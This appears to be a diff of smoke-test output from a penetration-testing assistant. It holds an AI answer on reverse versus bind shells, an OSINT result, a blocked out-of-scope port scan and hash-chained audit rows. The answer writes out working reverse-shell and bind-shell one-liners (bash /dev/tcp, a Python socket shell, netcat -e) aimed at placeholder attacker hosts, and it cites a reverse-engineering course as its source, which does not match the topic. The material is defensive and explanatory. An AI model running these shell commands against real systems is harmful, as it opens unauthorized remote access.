@@ -15,9 +15,9 @@
     },
     "response": {
       "status_code": 200,
-      "elapsed_ms": 24128.85,
+      "elapsed_ms": 23516.96,
       "headers": {
-        "content-length": "6346",
+        "content-length": "6461",
         "content-type": "application/json",
         "content-security-policy": "default-src 'none'; script-src 'sha256-lkff14kwp6qRYvZVJ0MlxRiHQrbEwecMSC5dZyMAujE=' 'sha256-nlhHPA3QznQUFyhBv+qH7XP5HPH14L2Q9xZsUhfLruU=' 'sha256-SKxGX+iWRUKM3T393b6vWbACMANJI5xarc1f7+jAGco=' 'sha256-4eQYiZoT9+v08fGBtvSKPtjwbh2Q9l6HJxNa6xUwh2k=' 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'self' http://localhost:8080 http://127.0.0.1:8080 http://localhost:8765 http://127.0.0.1:8765; form-action 'self'; base-uri 'none'; frame-ancestors 'none'",
         "x-content-type-options": "nosniff",
@@ -25,9 +25,9 @@
         "referrer-policy": "no-referrer"
       },
       "body": {
-        "response": "In the context of network penetration testing and offensive security operations, the core differences between a **reverse shell** and a **bind shell** lie in the direction of the network connection, the firewall/NAT traversal requirements, and the typical deployment scenarios.\n\nHere is a technical breakdown of the differences:\n\n### 1. Connection Direction\n*   **Reverse Shell:**\n    *   **Initiator:** The **victim** (target) machine initiates the connection to the **attacker** (listener).\n    *   **Flow:** Target $\\rightarrow$ Attacker.\n    *   **Mechanism:** The target executes a command that connects out to the attacker\u2019s IP and port, then redirects the standard input/output/error streams of a shell to that socket.\n*   **Bind Shell:**\n    *   **Initiator:** The **attacker** initiates the connection to the **victim** (target) machine.\n    *   **Flow:** Attacker $\\rightarrow$ Target.\n    *   **Mechanism:** The target executes a command that binds a shell to a specific local port and listens for incoming connections. The attacker then connects to that port.\n\n### 2. Firewall and NAT Traversal\n*   **Reverse Shell:**\n    *   **Advantage:** Generally easier to deploy in modern environments. Most outbound traffic (especially on ports like 443, 80, or 53) is allowed by corporate firewalls and NAT devices. Since the connection originates from inside the network, it bypasses inbound firewall rules.\n    *   **Use Case:** Preferred when the target is behind a NAT or firewall that blocks inbound connections.\n*   **Bind Shell:**\n    *   **Disadvantage:** Requires the target to have an open inbound port. If the target is behind a NAT or a stateful firewall that blocks unsolicited inbound traffic, the bind shell will fail.\n    *   **Use Case:** Useful when the target is directly accessible on the network (e.g., internal lateral movement, or a host with a public IP and open ports).\n\n### 3. Implementation Examples (Linux)\n*   **Reverse Shell:**\n    ```bash\n    # Target executes:\n    bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\n    ```\n    *   The target connects to `ATTACKER_IP:PORT`.\n*   **Bind Shell:**\n    ```bash\n    # Target executes:\n    nc -l -p PORT -e /bin/bash\n    # Or using bash built-in:\n    bash -c 'while true; do /bin/bash -i >& /dev/udp/0.0.0.0/PORT 0>&1; done'\n    ```\n    *   The target listens on `PORT`. The attacker connects to `TARGET_IP:PORT`.\n\n### 4. Detection and Defense Considerations\n*   **Reverse Shell:**\n    *   **Detection:** Look for outbound connections from internal hosts to external IPs on non-standard ports. EDR solutions often flag processes like `bash`, `nc`, or `python` making outbound network connections.\n    *   **Defense:** Egress filtering (blocking outbound traffic to unauthorized IPs/ports), network segmentation, and monitoring for unusual process-to-network behavior.\n*   **Bind Shell:**\n    *   **Detection:** Look for unexpected listening ports on internal hosts. Tools like `netstat`, `ss`, or EDR alerts for new listening sockets.\n    *   **Defense:** Host-based firewalls (e.g., `iptables`, `ufw`, Windows Firewall) configured to deny inbound connections by default, and monitoring for unauthorized listening services.\n\n### Summary Table\n\n| Feature | Reverse Shell | Bind Shell |\n| :--- | :--- | :--- |\n| **Connection Initiated By** | Target (Victim) | Attacker |\n| **Direction** | Target $\\rightarrow$ Attacker | Attacker $\\rightarrow$ Target |\n| **Firewall/NAT Friendly** | Yes (Outbound traffic) | No (Requires Inbound access) |\n| **Typical Use Case** | External compromise, NATed hosts | Internal lateral movement, direct access |\n| **Port Status on Target** | No listening port required | Must listen on a port |\n\n### Security Note\nBoth techniques are commonly used in penetration testing to establish interactive access. Defenders should monitor for:\n1.  **Outbound connections** from internal hosts to external IPs (reverse shell indicator).\n2.  **Unexpected listening ports** on internal hosts (bind shell indicator).\n3.  **Process behavior** such as shells (`/bin/bash`, `/bin/sh`) making network connections, which is highly anomalous in most environments.\n\nSources: [Reverse Engineering Fundamentals: Disassembly & Decompilation \u2014 SANS FOR610 / Ghidra Software Reverse Engineering Suite]",
+        "response": "In the context of network penetration testing and offensive security operations, the core differences between a **reverse shell** and a **bind shell** lie in the direction of the connection, the network topology requirements, and the typical use cases.\n\n### 1. Direction of Connection\n*   **Reverse Shell:** The **victim** (target) initiates the connection to the **attacker** (listener).\n    *   *Flow:* Target \u2192 Attacker\n    *   *Analogy:* The target \"calls out\" to the attacker.\n*   **Bind Shell:** The **attacker** initiates the connection to the **victim** (listener).\n    *   *Flow:* Attacker \u2192 Target\n    *   *Analogy:* The attacker \"calls in\" to the target.\n\n### 2. Network Topology & Firewall Traversal\n*   **Reverse Shell:**\n    *   **Preferred in most scenarios.**\n    *   Works effectively when the target is behind a **NAT (Network Address Translation)**, **firewall**, or **proxy** that blocks inbound connections but allows outbound traffic (e.g., HTTP/HTTPS, DNS).\n    *   The target only needs outbound access to the attacker's IP/port.\n*   **Bind Shell:**\n    *   Requires the attacker to have **direct inbound access** to the target's IP address and port.\n    *   Fails if the target is behind a NAT, firewall, or DMZ that blocks unsolicited inbound connections.\n    *   Useful when the target is on a flat internal network with no inbound filtering, or when the attacker has already established a foothold with direct network visibility.\n\n### 3. Implementation & Detection\n*   **Reverse Shell:**\n    *   **Payload:** Typically uses `nc -e /bin/sh` (or `bash`), `python -c 'import socket,subprocess,os;...'`, or meterpreter.\n    *   **Detection:** Easier to detect on the **attacker's side** (listening for inbound connections) and on the **target's side** (outbound connection to an external IP). Network IDS/IPS can flag unusual outbound connections to non-standard ports or known C2 infrastructure.\n*   **Bind Shell:**\n    *   **Payload:** Typically uses `nc -l -p <port> -e /bin/sh` (or `bash`) on the target.\n    *   **Detection:** Easier to detect on the **target's side** (listening on a non-standard port) and on the **attacker's side** (outbound connection to the target). Network IDS/IPS can flag new listening services on the target.\n\n### 4. Use Cases\n*   **Reverse Shell:**\n    *   Exploiting web applications (RCE via SQLi, file upload, etc.).\n    *   Compromising hosts behind NAT/firewalls.\n    *   Initial access in most modern penetration tests.\n*   **Bind Shell:**\n    *   Compromising hosts on flat internal networks (e.g., lab environments, some legacy corporate networks).\n    *   When the attacker has direct network access to the target's IP.\n    *   Less common in real-world engagements due to NAT/firewall prevalence.\n\n### 5. Example Commands (Linux)\n\n#### Reverse Shell (Target initiates)\n**Attacker (Listener):**\n```bash\nnc -lvnp 4444\n```\n**Target (Payload):**\n```bash\nnc <attacker_ip> 4444 -e /bin/sh\n# or\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<attacker_ip>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n```\n\n#### Bind Shell (Attacker initiates)\n**Target (Listener):**\n```bash\nnc -lvnp 4444 -e /bin/sh\n```\n**Attacker (Client):**\n```bash\nnc <target_ip> 4444\n```\n\n### Summary Table\n\n| Feature | Reverse Shell | Bind Shell |\n| :--- | :--- | :--- |\n| **Connection Direction** | Target \u2192 Attacker | Attacker \u2192 Target |\n| **Firewall/NAT Traversal** | Yes (if outbound allowed) | No (requires inbound access) |\n| **Typical Use Case** | Web app exploits, NATed hosts | Flat internal networks, labs |\n| **Detection Focus** | Outbound from target, Inbound to attacker | Inbound to target, Outbound from attacker |\n| **Prevalence** | High (most common) | Low (less common in real-world) |\n\n### Security Note\nBoth reverse and bind shells are **unauthorized access techniques** and are illegal without explicit written permission. In penetration testing, they are used to demonstrate the impact of vulnerabilities (e.g., RCE) and to establish a foothold for further assessment. Always ensure you have a signed scope of work and authorization before deploying any shell.\n\nSources: [Reverse Engineering Fundamentals: Disassembly & Decompilation \u2014 SANS FOR610 / Ghidra Software Reverse Engineering Suite]",
         "task": {
-          "id": "task-dffdb64b419c",
+          "id": "task-c6f88b534bac",
           "conversation_id": "smoke-test-conv-01",
           "assessment_id": null,
           "parent_task_id": null,
@@ -38,26 +38,26 @@
           "capability": "chat.general",
           "target": "",
           "scope_authorized": true,
-          "started_at": "2026-11-09T17:38:25.538424+00:00",
-          "completed_at": "2026-11-09T17:38:45.065028+00:00",
+          "started_at": "2026-11-09T18:51:21.535320+00:00",
+          "completed_at": "2026-11-09T18:51:40.849162+00:00",
           "stages": [],
           "result": {},
           "evidence_ids": [],
           "finding_ids": [],
           "error": null,
           "response_text": "",
-          "fingerprint": "cde5d42881f867e13a07b02c3c0c14b85a327dcd646e11517c519a1845bb73c5"
+          "fingerprint": "7ee3974523802901bb3617e7584f78f2e071516a7debe36ffa7d603519316f4c"
         },
         "assessment_id": null,
         "conversation_id": "smoke-test-conv-01",
         "telemetry": {
-          "latency_ms": 19516.0,
+          "latency_ms": 19328.0,
           "provider": "groq",
           "model": "groq/qwen/qwen3.8-27b",
           "token_usage_reported": true,
           "prompt_tokens": 1027,
-          "completion_tokens": 1027,
-          "total_tokens": 2054,
+          "completion_tokens": 1134,
+          "total_tokens": 2161,
           "cost_estimate": "NOT_REPORTED",
           "provider_status": {
             "attempted": true,
@@ -79,7 +79,7 @@
                 "provider": "groq",
                 "model": "groq/qwen/qwen3.8-27b",
                 "status": "INFERENCE_VERIFIED",
-                "latency_s": 2.58
+                "latency_s": 3.0
               }
             ]
           }
@@ -101,8 +101,8 @@
         },
         "capability": "GENERAL_CHAT",
         "request_context": {
-          "request_id": "req-5834e617ec17",
-          "task_id": "task-dffdb64b419c",
+          "request_id": "req-71a1d12a7234",
+          "task_id": "task-c6f88b534bac",
           "user_message": "What are the core differences between a reverse shell and a bind shell in network penetration testing?",
           "task_type": "general_chat",
           "explicit_target": null,
@@ -122,7 +122,7 @@
     "description": "Real OSINT lookup against authorized domain with evidence IDs",
     "result": {
       "target": "scanme.nmap.org",
-      "elapsed_ms": 11.23,
+      "elapsed_ms": 6.57,
       "indicator": "scanme.nmap.org",
       "query_type": "domain",
       "status": "OBSERVED",
@@ -166,7 +166,7 @@
           "{\n  \"count\": 2,\n  \"targets\": [\n    {\n      \"cidr\": \"127.0.0.1/32\",\n      \"domain\": null,\n      \"label\": \"Authorized loopback test target\",\n      \"ports\": [\n        80,\n        443,\n        8765\n      ],\n      \"allowed_actions\": [\n        \"scan\",\n        \"recon\",\n        \"osint\"\n      ]\n    },\n    {\n      \"cidr\": null,\n      \"domain\": \"scanme.nmap.org\",\n      \"label\": \"Authorized public reconnaissance test domain\",\n      \"ports\": [\n        80,\n        443\n      ],\n      \"allowed_actions\": [\n        \"recon\",\n        \"osint\"\n      ]\n    }\n  ]\n}"
         ]
       },
-      "roundtrip_ms": 34.45
+      "roundtrip_ms": 15.56
     }
   },
   "smoke_test_4_out_of_scope": {
@@ -191,7 +191,7 @@
       "response_body": {
         "response": "### \ud83d\udee1\ufe0f REDLOOP Policy-Enforced Tool: `PORTS` on `192.0.2.200`\n**Target:** `192.0.2.200` \u00b7 **Requested Capability:** `tool_ports` \u00b7 **Status:** `\ud83d\udd34 BLOCKED (Target Outside Active Signed Scope)`\n\n> **Technical Scope Policy:** REDLOOP enforces fail-closed scope validation before initiating raw sockets or probes. Zero network packets were transmitted to `192.0.2.200`.\n\n#### \ud83d\udcca Stage Execution Status\n| Stage | Status | Findings | Operational Result |\n| :--- | :---: | :---: | :--- |\n| **Local Evidence Review** | \ud83d\udfe2 SUCCESS | 0 | NO LOCAL EVIDENCE AVAILABLE. |\n| **Ports Probe** | \ud83d\udd34 BLOCKED | 0 | Prohibited by active signed scope contract |\n\n#### \ud83d\udd2c Local Intelligence & History\n**NO LOCAL EVIDENCE AVAILABLE.**\n- **Local Database:** `0` historical findings found for `192.0.2.200`.\n- **Evidence Ledger:** `0` prior evidence artifacts recorded.\n- **Network Transmission:** `0` TCP/UDP packets or DNS queries transmitted (zero probe leakage).\n- **Information Isolation:** No external knowledge, DNS lookup, OSINT, or pretrained model speculation was used.\n\n---\n[\ud83d\udcc1 Inspect Local Evidence](/workbench?view=evidence) &nbsp;|&nbsp; [\ud83d\udee1\ufe0f Review Scope Configuration](/workbench?view=scope) &nbsp;|&nbsp; [\ud83c\udf10 Attack Surface Graph](/workbench?view=attack-surface)",
         "task": {
-          "id": "task-dd608aed53be",
+          "id": "task-71d4322baf7e",
           "conversation_id": "workbench-copilot",
           "assessment_id": null,
           "parent_task_id": null,
@@ -202,8 +202,8 @@
           "capability": "tool.tool_ports",
           "target": "192.0.2.200",
           "scope_authorized": false,
-          "started_at": "2026-11-09T17:38:45.951101+00:00",
-          "completed_at": "2026-11-09T17:38:45.998620+00:00",
+          "started_at": "2026-11-09T18:51:41.443400+00:00",
+          "completed_at": "2026-11-09T18:51:41.489753+00:00",
           "stages": [
             {
               "name": "local_evidence_review",
@@ -245,7 +245,7 @@
           "finding_ids": [],
           "error": null,
           "response_text": "### \ud83d\udee1\ufe0f REDLOOP Policy-Enforced Tool: `PORTS` on `192.0.2.200`\n**Target:** `192.0.2.200` \u00b7 **Requested Capability:** `tool_ports` \u00b7 **Status:** `\ud83d\udd34 BLOCKED (Target Outside Active Signed Scope)`\n\n> **Technical Scope Policy:** REDLOOP enforces fail-closed scope validation before initiating raw sockets or probes. Zero network packets were transmitted to `192.0.2.200`.\n\n#### \ud83d\udcca Stage Execution Status\n| Stage | Status | Findings | Operational Result |\n| :--- | :---: | :---: | :--- |\n| **Local Evidence Review** | \ud83d\udfe2 SUCCESS | 0 | NO LOCAL EVIDENCE AVAILABLE. |\n| **Ports Probe** | \ud83d\udd34 BLOCKED | 0 | Prohibited by active signed scope contract |\n\n#### \ud83d\udd2c Local Intelligence & History\n**NO LOCAL EVIDENCE AVAILABLE.**\n- **Local Database:** `0` historical findings found for `192.0.2.200`.\n- **Evidence Ledger:** `0` prior evidence artifacts recorded.\n- **Network Transmission:** `0` TCP/UDP packets or DNS queries transmitted (zero probe leakage).\n- **Information Isolation:** No external knowledge, DNS lookup, OSINT, or pretrained model speculation was used.\n\n---\n[\ud83d\udcc1 Inspect Local Evidence](/workbench?view=evidence) &nbsp;|&nbsp; [\ud83d\udee1\ufe0f Review Scope Configuration](/workbench?view=scope) &nbsp;|&nbsp; [\ud83c\udf10 Attack Surface Graph](/workbench?view=attack-surface)",
-          "fingerprint": "b3a888c53b2f6f39365ce784148dbc82461b012393368720e39664f63e6e7ae2"
+          "fingerprint": "ee871b27e858bd4abe0180835bfb8d1f0ac4ece7ac2394832dcb0725e52efde6"
         },
         "structured_result": {
           "status": "partially_blocked",
@@ -271,7 +271,7 @@
         "assessment_id": null,
         "conversation_id": "workbench-copilot",
         "telemetry": {
-          "latency_ms": 63.0
+          "latency_ms": 47.0
         },
         "intent": {
           "action": "tool_ports",
@@ -290,8 +290,8 @@
         },
         "capability": "TOOL_EXECUTION",
         "request_context": {
-          "request_id": "req-15e85fc81d8e",
-          "task_id": "task-dd608aed53be",
+          "request_id": "req-154c53e5e459",
+          "task_id": "task-71d4322baf7e",
           "user_message": "Scan all ports and assess vulnerabilities on 192.0.2.200",
           "task_type": "tool_ports",
           "explicit_target": "192.0.2.200",
@@ -327,113 +327,113 @@
     "audit_ledger_rows": [
       {
         "id": 10,
-        "timestamp": "2026-11-09T17:38:46.070401+00:00",
+        "timestamp": "2026-11-09T18:51:41.559815+00:00",
         "target": "192.0.2.200:80",
         "action": "mcp:run_recon",
         "module": "mcp",
         "status": "BLOCKED",
         "details": "{\"status\": \"error\", \"error\": \"SCOPE_DENIED\", \"message\": \"Scope blocked: 192.0.2.200 [scan] - 192.0.2.200 is not present in scope.yaml \\u2014 refusing to act\"}",
-        "prev_hash": "1fa37fc0a6865820c5490be6302c301daf952b13b1f7c0c1ae6ed0893fc3b7a1",
-        "event_hash": "bd68f5b6455afcb829a12cff7db57ca9970b6b6c7c7f2c523a3b30aa62864d94"
+        "prev_hash": "fe9fad7a7bd2b3f1e3912c33a0d6ab88862457d8a1a91820ce8d13d5e9edeba1",
+        "event_hash": "c51789b0c3634b3d7aca4f8473c3e2e118e62a3dd86a8c8b0727dbc4ba8c42fe"
       },
       {
         "id": 9,
-        "timestamp": "2026-11-09T17:38:46.061403+00:00",
+        "timestamp": "2026-11-09T18:51:41.550042+00:00",
         "target": "192.0.2.200",
         "action": "scan",
         "module": "scope_guard",
         "status": "blocked",
         "details": "{\"reason\": \"192.0.2.200 is not present in scope.yaml \\u2014 refusing to act\", \"scope_entry\": null}",
-        "prev_hash": "740ec0db7547dd03b1a28d974268c8841a187ea5144cd4e96ab9b34d3fe34efe",
-        "event_hash": "1fa37fc0a6865820c5490be6302c301daf952b13b1f7c0c1ae6ed0893fc3b7a1"
+        "prev_hash": "41032442be7939d5c7e1c4c57269bbe2754087758f6acccfd293d3760a1738df",
+        "event_hash": "fe9fad7a7bd2b3f1e3912c33a0d6ab88862457d8a1a91820ce8d13d5e9edeba1"
       },
       {
         "id": 8,
-        "timestamp": "2026-11-09T17:38:46.051409+00:00",
+        "timestamp": "2026-11-09T18:51:41.543058+00:00",
         "target": "192.0.2.200",
         "action": "mcp:scope_check",
         "module": "mcp",
         "status": "BLOCKED",
         "details": "{\"allowed\": false, \"target\": \"192.0.2.200\", \"action\": \"recon\", \"port\": 80, \"reason\": \"Scope blocked: 192.0.2.200 [recon] - 192.0.2.200 is not present in scope.yaml \\u2014 refusing to act\"}",
-        "prev_hash": "b684b7f0d38909ff8667881c498f88f2bbf673f61022a1ce9045499cb2ea1cf6",
-        "event_hash": "740ec0db7547dd03b1a28d974268c8841a187ea5144cd4e96ab9b34d3fe34efe"
+        "prev_hash": "b59ff148046c00074dbae8adfc586de5203a20104a770819836a2097b0671b5b",
+        "event_hash": "41032442be7939d5c7e1c4c57269bbe2754087758f6acccfd293d3760a1738df"
       },
       {
         "id": 7,
-        "timestamp": "2026-11-09T17:38:46.043404+00:00",
+        "timestamp": "2026-11-09T18:51:41.536165+00:00",
         "target": "192.0.2.200",
         "action": "recon",
         "module": "scope_guard",
         "status": "blocked",
         "details": "{\"reason\": \"192.0.2.200 is not present in scope.yaml \\u2014 refusing to act\", \"scope_entry\": null}",
-        "prev_hash": "4430eab352f9ece6719977744478508c667daa51a681df74c5963822f5f98580",
-        "event_hash": "b684b7f0d38909ff8667881c498f88f2bbf673f61022a1ce9045499cb2ea1cf6"
+        "prev_hash": "bc94ad5cbe3d9f3db33756800e694c63b058b47ba33cf28c4b2f29b39e93489e",
+        "event_hash": "b59ff148046c00074dbae8adfc586de5203a20104a770819836a2097b0671b5b"
       },
       {
         "id": 6,
-        "timestamp": "2026-11-09T17:38:46.008638+00:00",
+        "timestamp": "2026-11-09T18:51:41.499038+00:00",
         "target": "copilot-turn",
         "action": "chat_turn",
         "module": "assistant",
         "status": "completed",
         "details": "{\"conversation_id\": \"workbench-copilot\", \"prompt\": \"Scan all ports and assess vulnerabilities on 192.0.2.200\", \"capability\": \"TOOL_EXECUTION\"}",
-        "prev_hash": "5952d23e74ca792e27d7f63f913744722a609fbc042f016f1028c6bd0de2214d",
-        "event_hash": "4430eab352f9ece6719977744478508c667daa51a681df74c5963822f5f98580"
+        "prev_hash": "c71b2ffa00215b6028b34edb0c2fa9f3c84d0f0027c6d255bd99bdfdea21a9d1",
+        "event_hash": "bc94ad5cbe3d9f3db33756800e694c63b058b47ba33cf28c4b2f29b39e93489e"
       },
       {
         "id": 5,
-        "timestamp": "2026-11-09T17:38:45.989063+00:00",
+        "timestamp": "2026-11-09T18:51:41.478074+00:00",
         "target": "192.0.2.200",
         "action": "tool_ports",
         "module": "scope_guard",
         "status": "blocked",
         "details": "{\"reason\": \"Target '192.0.2.200' is not authorized by the active signed scope contract for capability 'tool_ports'.\", \"scope_entry\": null}",
-        "prev_hash": "7f26241fdd6fb6bbdde8b8350d86953fa220961b2bbdedf6846dd7e7548e2a96",
-        "event_hash": "5952d23e74ca792e27d7f63f913744722a609fbc042f016f1028c6bd0de2214d"
+        "prev_hash": "dadba0d6b0eb9180ccd7631f240ef74210db4b23dded38c0451159d5940bedf9",
+        "event_hash": "c71b2ffa00215b6028b34edb0c2fa9f3c84d0f0027c6d255bd99bdfdea21a9d1"
       },
       {
         "id": 4,
-        "timestamp": "2026-11-09T17:38:45.978348+00:00",
+        "timestamp": "2026-11-09T18:51:41.468774+00:00",
         "target": "192.0.2.200",
         "action": "scan",
         "module": "scope_guard",
         "status": "blocked",
         "details": "{\"reason\": \"192.0.2.200 is not present in scope.yaml \\u2014 refusing to act\", \"scope_entry\": null}",
-        "prev_hash": "2f5ac5f5f486e6d9aa51e2a5d0f979155487e09cfc4272c746d284f56cdfb5c8",
-        "event_hash": "7f26241fdd6fb6bbdde8b8350d86953fa220961b2bbdedf6846dd7e7548e2a96"
+        "prev_hash": "d3d5464ea46c49e039cbf06ce23fd45457c4579bcdc4d8371a68ad0377ab8b83",
+        "event_hash": "dadba0d6b0eb9180ccd7631f240ef74210db4b23dded38c0451159d5940bedf9"
       },
       {
         "id": 3,
-        "timestamp": "2026-11-09T17:38:45.884217+00:00",
+        "timestamp": "2026-11-09T18:51:41.407271+00:00",
         "target": "*",
         "action": "mcp:list_targets",
         "module": "mcp",
         "status": "SUCCESS",
         "details": "{\"count\": 2}",
-        "prev_hash": "3f3725f96ea8624de98db7df6a3db473c5370833ac79d468e4d6a309c9d61c19",
-        "event_hash": "2f5ac5f5f486e6d9aa51e2a5d0f979155487e09cfc4272c746d284f56cdfb5c8"
+        "prev_hash": "947c66e94e52f4a6cb2626cfb17f50ad046751099f8b27be3a9460bea9a58fec",
+        "event_hash": "d3d5464ea46c49e039cbf06ce23fd45457c4579bcdc4d8371a68ad0377ab8b83"
       },
       {
         "id": 2,
-        "timestamp": "2026-11-09T17:38:45.864957+00:00",
+        "timestamp": "2026-11-09T18:51:41.397678+00:00",
         "target": "127.0.0.1",
         "action": "mcp:scope_check",
         "module": "mcp",
         "status": "ALLOWED",
         "details": "{\"allowed\": true, \"target\": \"127.0.0.1\", \"action\": \"recon\", \"port\": 80, \"reason\": \"AUTHORIZED\"}",
-        "prev_hash": "42fecfd3c0a31adf621c8934a7c821786a3f8b83d3c917e4581c40af8667144f",
-        "event_hash": "3f3725f96ea8624de98db7df6a3db473c5370833ac79d468e4d6a309c9d61c19"
+        "prev_hash": "2b9eb27d6f8b3120d08557bfc3e7574ba25156c76f0c26ccb94d75a4354415ba",
+        "event_hash": "947c66e94e52f4a6cb2626cfb17f50ad046751099f8b27be3a9460bea9a58fec"
       },
       {
         "id": 1,
-        "timestamp": "2026-11-09T17:38:45.094157+00:00",
+        "timestamp": "2026-11-09T18:51:40.864063+00:00",
         "target": "copilot-turn",
         "action": "chat_turn",
         "module": "assistant",
         "status": "completed",
         "details": "{\"conversation_id\": \"smoke-test-conv-01\", \"prompt\": \"What are the core differences between a reverse shell and a bind shell in network penetration testing?\", \"capability\": \"GENERAL_CHAT\"}",
         "prev_hash": "0000000000000000000000000000000000000000000000000000000000000000",
-        "event_hash": "42fecfd3c0a31adf621c8934a7c821786a3f8b83d3c917e4581c40af8667144f"
+        "event_hash": "2b9eb27d6f8b3120d08557bfc3e7574ba25156c76f0c26ccb94d75a4354415ba"
       }
     ]
   }
